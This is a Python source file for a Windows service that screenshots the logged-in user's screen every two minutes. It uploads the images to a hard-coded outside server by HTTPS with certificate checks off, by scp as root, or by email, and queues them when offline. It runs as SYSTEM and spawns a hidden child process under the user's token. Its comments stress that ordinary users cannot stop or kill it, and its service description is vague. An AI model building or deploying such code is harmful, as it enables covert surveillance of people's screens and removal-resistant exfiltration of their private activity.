#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
screenwatch.py — 极简「截屏 → 邮件」监控 (Windows)

行为:
  * 每 INTERVAL 秒截一次当前登录用户的主屏幕,
    JPEG 压缩(硬上限 MAX_JPEG_BYTES, 默认 100KB), 发到 MAIL_TO。
  * 锁屏/登录界面时自动跳过(前台窗口属于 LogonUI.exe), 不截不发不排队。
  * 发送失败(断网/SMTP 错误等)时, 图片存到 %TEMP%\\screenwatch_queue,
    每个周期按时间顺序重发, 发送成功后删除对应文件。
  * 以 SYSTEM 身份注册为 Windows 服务: 普通用户账户无法停止服务,
    任务管理器里也结束不掉其进程。

安装 (管理员账户的 cmd):
  pip install pywin32 pillow
  python screenwatch.py install
  python screenwatch.py start
卸载:
  python screenwatch.py stop
  python screenwatch.py remove
快速测试 (任意账户前台运行, 不进服务, 立即截第一张):
  python screenwatch.py debug
"""
import configparser
import ctypes
import io
import json
import os
import smtplib
import socket
import ssl
import sys
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import win32security
from http.cookiejar import CookieJar
from ctypes import wintypes
from datetime import datetime
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from PIL import Image

# ==================== 配置区 ====================
# 敏感/环境配置从同目录的 screenmonitor.conf 读取(该文件已加入 .gitignore,
# 不会提交到 git)。首次部署: copy screenmonitor.conf.example screenmonitor.conf
# 再填入真实值。配置文件缺失时使用下方默认值(便于无配置环境直接跑)。
CONF_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "screenmonitor.conf")
_cfg = configparser.ConfigParser()
if os.path.exists(CONF_FILE):
    _cfg.read(CONF_FILE, encoding="utf-8")

def _conf_bool(sec, key, default):
    v = _cfg.getboolean(sec, key, fallback=None)
    return default if v is None else v
def _conf_int(sec, key, default):
    v = _cfg.getint(sec, key, fallback=None)
    return default if v is None else v
def _conf_str(sec, key, default):
    v = _cfg.get(sec, key, fallback=None)
    return (v.strip() if v is not None else default)

# 优先传输方式: scp 到备份服务器; scp 成功则不再发邮件, scp 失败再回落 SMTP 邮件。
# 注意: 发送在服务主进程(SYSTEM)里执行, 与"谁登录"无关; 故 SSH 密钥须 SYSTEM 可读
#       (已把密钥复制到自包含目录并收紧权限, 不依赖任何具体用户)。
SCP_ENABLED   = _conf_bool("scp", "enabled", True)
SCP_DEST      = _conf_str("scp", "dest", "root@121.40.190.90:/data/gesp/backup/")
SCP_KEY       = _conf_str("scp", "key", r"C:\ProgramData\screenwatch\ssh\id_rsa")
SCP_KNOWN_HOSTS = _conf_str("scp", "known_hosts",
                            r"C:\ProgramData\screenwatch\ssh\known_hosts")
SCP_STAGING_DIR = _conf_str("scp", "staging_dir",
                            r"C:\ProgramData\screenwatch\scp_out")
SCP_TIMEOUT   = _conf_int("scp", "timeout", 60)

# HTTP 上传: 第二优先传输; scp 失败时尝试, 成功则不再发邮件, 失败再回落 SMTP
HTTP_ENABLED  = _conf_bool("http", "enabled", True)
HTTP_URL      = _conf_str("http", "url", "https://121.40.190.90:8899").rstrip("/")
HTTP_USER     = _conf_str("http", "username", "")
HTTP_PASS     = _conf_str("http", "password", "")
HTTP_REMOTE_DIR = _conf_str("http", "remote_dir", "/data/gesp/backup")
HTTP_TIMEOUT  = _conf_int("http", "timeout", 30)

SMTP_HOST = _conf_str("mail", "host", "smtp.sina.com")
SMTP_PORT = _conf_int("mail", "port", 465)
SMTP_SSL  = _conf_bool("mail", "ssl", True)
SMTP_USER = _conf_str("mail", "user", "")
SMTP_PASS = _conf_str("mail", "password", "")
MAIL_TO   = _conf_str("mail", "to", "")   # 多个收件人用英文逗号分隔

INTERVAL        = _conf_int("run", "interval", 120)
MAX_JPEG_BYTES  = _conf_int("run", "max_jpeg_bytes", 100 * 1024)
QUEUE_MAX       = _conf_int("run", "queue_max", 3000)
FLUSH_PER_CYCLE = _conf_int("run", "flush_per_cycle", 30)
# 发送方式优先级: 逗号分隔, 可选值 http/scp/smtp, 按顺序尝试, 前面的失败再试后面的
SEND_PRIORITY = _conf_str("run", "send_priority", "http, scp, smtp")
# ==================== 配置结束 ====================

HOSTNAME   = socket.gethostname()
QUEUE_DIR  = os.path.join(tempfile.gettempdir(), "screenwatch_queue")
LOG_FILE   = os.path.join(tempfile.gettempdir(), "screenwatch.log")
stop_event = threading.Event()


def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("[{}] {}\n".format(
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"), msg))
        if os.path.getsize(LOG_FILE) > 512 * 1024:
            os.replace(LOG_FILE, LOG_FILE + ".old")
    except Exception:
        pass


# ---------- 截屏 (服务在 session 0, 需附加到用户会话桌面) ----------
user32   = ctypes.windll.user32
gdi32    = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32
kernel32.WTSGetActiveConsoleSessionId.restype = wintypes.DWORD  # 在 kernel32, 不在 user32
user32.OpenInputDesktop.restype = wintypes.HDESK  # WTSGetDesktopHandle 不存在, 用它
user32.GetThreadDesktop.restype = wintypes.HDESK
user32.SetThreadDesktop.restype = wintypes.BOOL
# 句柄返回值必须声明 restype, 否则 ctypes 按 32 位 int 截断 64 位指针;
# 同理, 接收句柄参数的函数必须声明 argtypes, 否则大指针值转换溢出
user32.GetForegroundWindow.restype = wintypes.HWND
user32.GetDC.restype = wintypes.HDC
user32.GetDC.argtypes = [wintypes.HWND]
user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
user32.SetThreadDesktop.argtypes = [wintypes.HDESK]
user32.CloseDesktop.argtypes = [wintypes.HDESK]
gdi32.CreateCompatibleDC.restype = wintypes.HDC
gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
gdi32.SelectObject.restype = wintypes.HGDIOBJ
gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
gdi32.BitBlt.argtypes = [wintypes.HDC] + [ctypes.c_int] * 4 + [wintypes.HDC] + [ctypes.c_int] * 2 + [wintypes.DWORD]
gdi32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT,
                            wintypes.UINT, ctypes.c_void_p, ctypes.c_void_p, wintypes.UINT]
gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
gdi32.DeleteDC.argtypes = [wintypes.HDC]
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.QueryFullProcessImageNameW.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPWSTR, wintypes.LPDWORD]
# DESKTOP_ALL_ACCESS (0x01FF): 服务在 session 0 截屏需要完整桌面权限,
# 权限不足时 OpenInputDesktop 返回 NULL -> "无法打开用户桌面"
DESKTOP_READ = 0x01FF

# ---------- 跨会话截屏 (session 0 服务 -> 用户会话子进程) ----------
# 背景: Vista 起 session 0 隔离, 服务在 session 0, 用户界面在 session 1/2;
#       OpenInputDesktop 只能取"本会话"桌面, 故服务里取不到用户桌面。
# 本 Windows 的 wtsapi32.dll 未导出 WTSGetDesktopHandle(无法直接跨会话取桌面),
#       改用 WTSQueryUserToken + CreateProcessAsUser 以用户令牌在用户会话里
#       拉起截屏子进程(子进程默认落在用户 Winlogon 桌面, BitBlt 即可截屏)。
wtsapi32 = ctypes.WinDLL("wtsapi32.dll", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32.dll", use_last_error=True)

wtsapi32.WTSQueryUserToken.argtypes = [wintypes.DWORD,
                                       ctypes.POINTER(wintypes.HANDLE)]
wtsapi32.WTSQueryUserToken.restype = wintypes.BOOL
# 按进程ID取会话号(kernel32 标准API, WTSGetProcessId 在本机缺失)
kernel32.GetCurrentProcessId.argtypes = []
kernel32.GetCurrentProcessId.restype = wintypes.DWORD
kernel32.ProcessIdToSessionId.argtypes = [wintypes.DWORD,
                                          ctypes.POINTER(wintypes.DWORD)]
kernel32.ProcessIdToSessionId.restype = wintypes.BOOL

# DuplicateTokenEx 在 advapi32 (不在 kernel32)
advapi32.DuplicateTokenEx.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p,
    wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
advapi32.DuplicateTokenEx.restype = wintypes.BOOL
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.GetExitCodeProcess.argtypes = [wintypes.HANDLE,
                                        ctypes.POINTER(wintypes.DWORD)]
kernel32.GetExitCodeProcess.restype = wintypes.BOOL
kernel32.CreateProcessAsUserW.argtypes = [
    wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
    ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p,
    wintypes.LPCWSTR, ctypes.c_void_p, ctypes.c_void_p]
kernel32.CreateProcessAsUserW.restype = wintypes.BOOL

MAXIMUM_ALLOWED = 0x02000000
TOKEN_PRIMARY = 1
SECURITY_IMPERSONATION_LEVEL = 2  # SecurityIdentification
WAIT_OBJECT_0, WAIT_TIMEOUT, WAIT_FAILED = 0, 258, 0xFFFFFFFF
STARTF_USESHOWWINDOW = 0x00000001
SW_HIDE = 0
DETACHED_PROCESS = 0x00000008


class _STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR), ("lpUsername", wintypes.LPWSTR),
                ("lpPassword", wintypes.LPWSTR), ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD), ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_void_p), ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)]


class _PROCINFO(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]


def my_session_id():
    """当前进程所在 Windows 会话号(服务=0, 用户登录=1/2)。"""
    sid = wintypes.DWORD()
    if kernel32.ProcessIdToSessionId(kernel32.GetCurrentProcessId(),
                                     ctypes.byref(sid)):
        return sid.value
    return 0xFFFFFFFF


def python_exe():
    """返回真正的 python.exe。
    服务由 pythonservice.exe 启动时 sys.executable 指向包装器, 需改用同目录的 python.exe。"""
    ex = os.path.abspath(sys.executable)
    if os.path.basename(ex).lower() == "pythonservice.exe":
        cand = os.path.join(os.path.dirname(ex), "python.exe")
        if os.path.exists(cand):
            return cand
    return ex


def capture_via_child(out_path, timeout=60):
    """以控制台会话用户身份在本机用户会话里跑截屏子进程。

    成功写 JPEG 到 out_path 返回 (True, None); 否则返回 (False, reason)。
    子进程命令: <python> <本脚本> capture <out_path>
    """
    sid = kernel32.WTSGetActiveConsoleSessionId()
    if sid == 0xFFFFFFFF:
        return False, "无活动控制台会话"
    huser = wintypes.HANDLE()
    if not wtsapi32.WTSQueryUserToken(sid, ctypes.byref(huser)):
        return False, "WTSQueryUserToken 失败 err=%d" % kernel32.GetLastError()
    hproc = hthread = wintypes.HANDLE()
    try:
        # 注: 实测 WTSQueryUserToken 返回的用户令牌可直接用于 CreateProcessAsUser,
        #     子进程以用户身份写用户自己的 Temp 无需修改默认 DACL, 故省略
        #     SetTokenInformation(TOKEN_DEFAULT_DACL)(在部分环境会返回 err=18)。
        # 复制为主令牌(供 CreateProcessAsUser 使用)
        htok = wintypes.HANDLE()
        if not advapi32.DuplicateTokenEx(
                huser, MAXIMUM_ALLOWED, None, SECURITY_IMPERSONATION_LEVEL,
                TOKEN_PRIMARY, ctypes.byref(htok)):
            return False, "DuplicateTokenEx 失败 err=%d" % kernel32.GetLastError()
        try:
            py = python_exe()
            cmd = '"{}" "{}" capture "{}"'.format(
                py, os.path.abspath(__file__), out_path)
            si = _STARTUPINFO()
            si.cb = ctypes.sizeof(si)
            si.dwFlags = STARTF_USESHOWWINDOW
            si.wShowWindow = SW_HIDE
            pi = _PROCINFO()
            if not kernel32.CreateProcessAsUserW(
                    htok, None, cmd, None, None, False, DETACHED_PROCESS,
                    None, None, ctypes.byref(si), ctypes.byref(pi)):
                return False, "CreateProcessAsUser 失败 err=%d" % kernel32.GetLastError()
            hproc, hthread = pi.hProcess, pi.hThread
            rc = kernel32.WaitForSingleObject(hproc, timeout * 1000)
            if rc == WAIT_TIMEOUT:
                kernel32.TerminateProcess(hproc, 1)
                return False, "截屏子进程超时 %ds" % timeout
            if rc not in (WAIT_OBJECT_0, WAIT_FAILED):
                return False, "等待子进程异常 rc=%d" % rc
            code = wintypes.DWORD()
            kernel32.GetExitCodeProcess(hproc, ctypes.byref(code))
            if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                return True, None
            return False, "子进程未产出图片 (exit=%d)" % code.value
        finally:
            if hthread:
                kernel32.CloseHandle(hthread)
            if hproc:
                kernel32.CloseHandle(hproc)
            kernel32.CloseHandle(htok)
    finally:
        kernel32.CloseHandle(huser)


class _BIH(ctypes.Structure):
    _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                ("biSizeImage", wintypes.DWORD), ("biX", wintypes.LONG),
                ("biY", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                ("biClrImportant", wintypes.DWORD)]


def is_locked():
    """锁屏/登录界面时, 当前桌面的前台窗口属于 LogonUI.exe。"""
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return True  # 无前台窗口, 按锁定处理
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, wintypes.LPDWORD]
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    if not pid.value:
        return True
    h = kernel32.OpenProcess(0x1000, False, pid.value)  # PROCESS_QUERY_LIMITED_INFORMATION
    if not h:
        return False  # 查不到进程名时不跳过, 避免误伤
    try:
        buf = ctypes.create_unicode_buffer(1024)
        size = wintypes.DWORD(len(buf))
        if kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size)):
            return os.path.basename(buf.value).lower() == "logonui.exe"
        return False
    finally:
        kernel32.CloseHandle(h)


def capture_screen():
    """返回 (img, reason)。成功时 reason 为 None; 否则 img 为 None, reason 是原因。"""
    sid = kernel32.WTSGetActiveConsoleSessionId()
    if sid == 0xFFFFFFFF:
        return None, "无活动控制台会话"
    hdesk = user32.OpenInputDesktop(0, False, DESKTOP_READ)
    if not hdesk:
        return None, "无法打开用户桌面"
    horig = user32.GetThreadDesktop(0)
    if not user32.SetThreadDesktop(hdesk):
        user32.CloseDesktop(hdesk)
        return None, "附加用户桌面失败"
    img, why = None, "BitBlt/GetDIBits 失败"
    try:
        if is_locked():
            return None, "锁屏/登录界面, 跳过"
        w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
        hdc = user32.GetDC(None)  # GetDC 在 user32, 不在 gdi32
        try:
            mdc = gdi32.CreateCompatibleDC(hdc)
            bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
            gdi32.SelectObject(mdc, bmp)
            if gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):
                buf = (ctypes.c_ubyte * (w * h * 4))()
                bmi = _BIH()
                bmi.biSize = ctypes.sizeof(bmi)
                bmi.biWidth, bmi.biHeight = w, -h     # -h: 自上而下
                bmi.biPlanes, bmi.biBitCount, bmi.biCompression = 1, 32, 0
                if gdi32.GetDIBits(mdc, bmp, 0, h, buf,
                                   ctypes.byref(bmi), 0) == h:
                    img, why = (Image.frombuffer("RGBA", (w, h), buf,
                                   "raw", "BGRA", 0, 1).convert("RGB")), None
        finally:
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(mdc)
            user32.ReleaseDC(None, hdc)
    finally:
        user32.SetThreadDesktop(horig)
        user32.CloseDesktop(hdesk)
    return img, why


# ---------- 压缩 (保证 <= MAX_JPEG_BYTES) ----------
def compress(img):
    w, h = img.size
    for scale in (1.0, 0.8, 0.6, 0.5, 0.4):
        im = img if scale == 1.0 else img.resize(
            (max(320, int(w * scale)), max(200, int(h * scale))), Image.LANCZOS)
        for q in (70, 60, 50, 45, 40, 35):
            buf = io.BytesIO()
            im.save(buf, "JPEG", quality=q)
            if buf.tell() <= MAX_JPEG_BYTES:
                return buf.getvalue()
    buf = io.BytesIO()  # 兜底, 实际不会到这里
    img.resize((320, 180)).save(buf, "JPEG", quality=30)
    return buf.getvalue()


# ---------- 邮件 ----------
def smtp_send(jpeg_bytes, label):
    msg = MIMEMultipart()
    msg["From"], msg["To"] = SMTP_USER, MAIL_TO
    msg["Subject"] = "[ScreenWatch] {} {}".format(HOSTNAME, label)
    msg.attach(MIMEText("Host: {}\nTime: {}\n".format(HOSTNAME, label),
                        "plain", "utf-8"))
    part = MIMEImage(jpeg_bytes, _subtype="jpeg")
    part.add_header("Content-Disposition", "attachment",
                    filename="screenwatch_{}.jpg".format(label))
    msg.attach(part)
    if SMTP_SSL:
        s = smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=30)
    else:
        s = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30)
        s.starttls()
    try:
        s.login(SMTP_USER, SMTP_PASS)
        s.sendmail(SMTP_USER, [x.strip() for x in MAIL_TO.split(",")],
                   msg.as_string())
    finally:
        s.quit()


# ---------- scp (优先传输) ----------
def scp_send(jpeg_bytes, label):
    """把 JPEG scp 到备份服务器。成功返回 None; 失败抛出异常(交由上层回落邮件)。

    用 subprocess 参数列表(不经 shell)调用 OpenSSH 的 scp.exe, 以 SYSTEM 身份执行。
    SSH 密钥/known_hosts 用自包含路径, 不依赖任何具体登录用户, 故换用户登录也有效。
    """
    if not SCP_ENABLED:
        raise RuntimeError("scp 已禁用")
    os.makedirs(SCP_STAGING_DIR, exist_ok=True)
    src = os.path.join(SCP_STAGING_DIR, "screenwatch_{}.jpg".format(label))
    with open(src, "wb") as f:
        f.write(jpeg_bytes)
    scp_exe = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"),
                           "System32", "OpenSSH", "scp.exe")
    if not os.path.exists(scp_exe):
        scp_exe = "scp"  # 回退到 PATH
    # 远端文件名: 与邮件附件同名, 便于对账
    remote = SCP_DEST + "screenwatch_{}.jpg".format(label)
    args = [scp_exe,
            "-i", SCP_KEY,
            "-o", "BatchMode=yes",                 # 无密钥时不卡密码提示
            "-o", "ConnectTimeout=15",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "UserKnownHostsFile=" + SCP_KNOWN_HOSTS,
            "-o", "LogLevel=ERROR",
            src, remote]
    try:
        r = subprocess.run(args, capture_output=True, text=True,
                           timeout=SCP_TIMEOUT)
    except subprocess.TimeoutExpired:
        raise RuntimeError("scp 超时 {}s".format(SCP_TIMEOUT))
    except FileNotFoundError:
        raise RuntimeError("找不到 scp.exe ({})".format(scp_exe))
    finally:
        # 清理本地暂存文件(邮件用的是内存 jpeg_bytes, 不再需要该文件), 避免堆积
        try:
            os.remove(src)
        except OSError:
            pass
    if r.returncode != 0:
        raise RuntimeError("scp rc={} stderr={}".format(
            r.returncode, (r.stderr or "").strip()[:300]))


# ---------- HTTP 上传 (次优先传输) ----------
# 远端 Node.js web server: 登录取会话 cookie, 再用 multipart 上传。
# 自签证书 -> 跳过 SSL 验证(等价 curl -k)。会话缓存到进程级, 失效时自动重登。
_http_jar   = CookieJar()
_http_opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ssl._create_unverified_context()),
    urllib.request.HTTPCookieProcessor(_http_jar))


def _http_request(method, path, data=None, headers=None):
    req = urllib.request.Request(HTTP_URL + path, data=data,
                                 method=method, headers=headers or {})
    try:
        resp = _http_opener.open(req, timeout=HTTP_TIMEOUT)
        code, body = resp.getcode(), resp.read()
    except urllib.error.HTTPError as e:
        code, body = e.code, e.read()
    except Exception as e:
        raise RuntimeError("HTTP 连接失败: {}".format(e))
    finally:
        try:
            resp.close()
        except Exception:
            pass
    return code, body


def _http_login():
    body = json.dumps({"user": HTTP_USER, "pass": HTTP_PASS}).encode()
    code, _ = _http_request("POST", "/api/login", data=body,
                            headers={"Content-Type": "application/json"})
    if code != 200:
        raise RuntimeError("HTTP 登录失败 (HTTP {})".format(code))


def _http_ensure_login():
    """探测会话有效性, 失效则登录。GET /api/fs?path=%2Fdata 返回 200 视为已登录。"""
    code, _ = _http_request("GET", "/api/fs?path=%2Fdata")
    if code != 200:
        _http_login()


def _http_multipart(data_bytes, filename, field="file"):
    """构造 multipart/form-data 请求体(纯标准库, 不依赖 requests)。"""
    boundary = "----screenwatch{}".format(int(time.time() * 1000))
    head = ("--{}\r\n"
            'Content-Disposition: form-data; name="{}"; filename="{}"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n").format(
                boundary, field, filename).encode()
    tail = ("\r\n--{}--\r\n".format(boundary)).encode()
    return head + data_bytes + tail, "multipart/form-data; boundary=" + boundary


def http_send(jpeg_bytes, label):
    """通过远端 web server 上传 JPEG (raw octet-stream)。成功返回 None; 失败抛出异常。"""
    if not HTTP_ENABLED:
        raise RuntimeError("http 已禁用")
    _http_ensure_login()
    fname = "screenwatch_{}.jpg".format(label)
    rdir = HTTP_REMOTE_DIR.rstrip("/")
    q = "/api/upload?path={}&filename={}".format(
        urllib.parse.quote(rdir, safe=""), urllib.parse.quote(fname, safe=""))
    code, body = _http_request("POST", q, data=jpeg_bytes, headers={
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(jpeg_bytes))})
    if code != 200:
        raise RuntimeError("HTTP 上传失败 (HTTP {} body={})".format(
            code, body[:200].decode("utf-8", "replace")))


def deliver(jpeg_bytes, label):
    """按 SEND_PRIORITY 配置的顺序(如 "http, scp, smtp")依次尝试发送,
    任一成功即返回方式名; 全部失败时抛出最后一个异常(交由上层入队)。
    被禁用(如 scp/http enabled=false)的方式直接跳过, 不视为失败。"""
    # (方式名, 发送函数, 是否启用); smtp 无独立开关, 恒启用
    methods = [
        ("http", http_send, HTTP_ENABLED),
        ("scp", scp_send, SCP_ENABLED),
        ("smtp", smtp_send, True),
    ]
    order = [x.strip().lower() for x in SEND_PRIORITY.split(",") if x.strip()]
    last_err = None
    for name in order:
        m = next((m for m in methods if m[0] == name), None)
        if m is None:
            log("未知发送方式, 跳过: {}".format(name))
            continue
        fn, enabled = m[1], m[2]
        if not enabled:
            log("{} 已禁用, 跳过".format(name))
            continue
        try:
            fn(jpeg_bytes, label)
            return name
        except Exception as e:
            last_err = e
            log("{} 发送失败, 尝试下一种: {}".format(name, e))
    if last_err is None:
        raise RuntimeError("无可用发送方式 (send_priority={!r})".format(SEND_PRIORITY))
    raise last_err


# ---------- 离线队列 ----------
def queue_files():
    try:
        return sorted(f for f in os.listdir(QUEUE_DIR) if f.endswith(".jpg"))
    except FileNotFoundError:
        return []


def flush_queue():
    """按时间顺序补发队列; 任一失败(视为网络不通)即停止本轮回补, 文件保留。"""
    for name in queue_files()[:FLUSH_PER_CYCLE]:
        if stop_event.is_set():
            break
        path, label = os.path.join(QUEUE_DIR, name), name[:-4]
        try:
            with open(path, "rb") as f:
                via = deliver(f.read(), label)
            os.remove(path)
            log("补发成功[{}] {} (队列剩 {})".format(
                via, label, len(queue_files()) - 1))
        except Exception as e:
            log("补发暂停 {}: {}".format(name, e))
            break


def enqueue(jpeg_bytes, label):
    with open(os.path.join(QUEUE_DIR, label + ".jpg"), "wb") as f:
        f.write(jpeg_bytes)
    files = queue_files()
    for old in files[:-QUEUE_MAX]:  # 超上限删最旧
        try:
            os.remove(os.path.join(QUEUE_DIR, old))
        except OSError:
            pass


def capture_to_file(out_path):
    """在"本进程所在会话"(子进程=用户会话)里截屏并写 JPEG。
    子进程默认落在用户 Winlogon 桌面, 直接 BitBlt 即可, 无需跨会话。"""
    img, why = capture_screen()
    if img is None:
        return False, why
    img.save(out_path, "JPEG", quality=85)
    return True, None


# ---------- 主循环 ----------
def capture_current(out_path):
    """统一截屏入口:
    - 服务(session 0): 通过 capture_via_child 以用户身份在用户会话截屏;
    - 前台(debug)/子进程: 直接 BitBlt。
    成功返回 (True, None); 否则 (False, reason)。"""
    if my_session_id() == 0:
        return capture_via_child(out_path)
    return capture_to_file(out_path)


def cycle():
    os.makedirs(QUEUE_DIR, exist_ok=True)
    flush_queue()
    if stop_event.is_set():
        return
    label = datetime.now().strftime("%Y%m%d_%H%M%S")
    tmp = os.path.join(QUEUE_DIR, ".shot_{}.jpg".format(label))
    ok, why = capture_current(tmp)
    if not ok:
        try:
            if os.path.exists(tmp):
                os.remove(tmp)
        except OSError:
            pass
        log("跳过截屏: {}".format(why))
        return
    try:
        with open(tmp, "rb") as f:
            img = Image.open(f)
            img.load()
        jpeg = compress(img)
    except Exception as e:
        log("跳过截屏: 解码失败 {}".format(e))
        try:
            os.remove(tmp)
        except OSError:
            pass
        return
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    try:
        via = deliver(jpeg, label)
        log("已发送[{}] {} ({}KB)".format(via, label, len(jpeg) // 1024))
    except Exception as e:
        enqueue(jpeg, label)
        log("存队列 {} ({}KB, 队列共 {}): {}".format(
            label, len(jpeg) // 1024, len(queue_files()), e))


def run_loop():
    log("启动: 间隔{}s, 队列目录 {}".format(INTERVAL, QUEUE_DIR))
    while not stop_event.is_set():
        t0 = time.time()
        try:
            cycle()
        except Exception as e:
            log("cycle 异常: {!r}".format(e))
        stop_event.wait(max(5.0, INTERVAL - (time.time() - t0)))
    log("已停止")


# ---------- Windows 服务 ----------
import win32serviceutil
import win32service


class ScreenWatchSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = "ScreenWatch"
    _svc_display_name_ = "Screen Watch (screenshot mailer)"
    # _svc_description_ = "每3分钟截取活动屏幕并发邮件; 锁屏跳过; 离线存临时目录, 恢复后补发"
    _svc_description_ = "Test capture screen and send"

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        stop_event.set()

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        run_loop()


if __name__ == "__main__":
    # 用法: python screenwatch.py [install|remove|start|stop|debug|capture]
    # debug   = 前台直接跑主循环(不装服务), 立即截第一张; Ctrl+C 停止
    # capture <out.jpg> = 以当前会话身份截屏写文件(供服务子进程调用, 勿手动运行)
    arg = sys.argv[1].lower() if len(sys.argv) > 1 else ""
    if arg == "capture":
        out = sys.argv[2] if len(sys.argv) > 2 else None
        if out:
            ok, why = capture_to_file(out)
            sys.exit(0 if ok else 1)
        sys.exit(2)
    elif arg == "debug":
        try:
            run_loop()
        except KeyboardInterrupt:
            stop_event.set()
    else:
        win32serviceutil.HandleCommandLine(ScreenWatchSvc)